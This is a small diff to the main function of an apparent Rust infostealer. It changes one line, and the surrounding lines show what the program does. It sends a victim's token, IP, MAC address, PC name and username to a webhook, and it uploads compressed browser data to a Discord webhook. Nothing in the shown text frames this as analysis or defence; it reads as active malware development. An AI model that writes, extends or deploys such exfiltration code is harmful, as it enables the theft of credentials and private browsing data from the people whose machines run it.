@@ -110,6 +110,6 @@ async fn main() {
         let _ = global::utils::send_data(&global::utils::WEBHOOK_URL, &format!("{:?}NOP{:?}NOP{:?},{:?},{:?},{:?}", final_creds_clone.token, final_creds_clone.id, final_creds_clone.ip, final_creds_clone.mac, final_creds_clone.pc_name, final_creds_clone.pc_user));
     });
 
-    global::utils::send_file_to_discord_webhook(&deflate_bytes(serde_json::to_string_pretty(&final_creds_clone.browsers).unwrap().as_bytes()), "deflated_data.txt", &global::utils::WEBHOOK_URL).unwrap();
+    let _ = global::utils::send_file_to_discord_webhook(&deflate_bytes(serde_json::to_string_pretty(&final_creds_clone.browsers).unwrap().as_bytes()), "deflated_data.txt", &global::utils::WEBHOOK_URL).unwrap();
     return;
 }
